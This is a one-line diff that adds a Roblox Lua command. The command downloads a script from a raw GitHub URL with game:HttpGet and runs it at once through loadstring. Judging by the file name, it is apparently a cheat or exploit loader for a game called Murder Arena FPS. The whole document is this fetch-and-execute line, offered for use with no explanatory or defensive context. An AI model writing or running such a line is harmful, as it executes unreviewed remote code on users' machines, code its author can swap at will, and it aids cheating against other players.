@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/murder-arena-fps-spam7-21hia0ukmb0eza.lua"))()
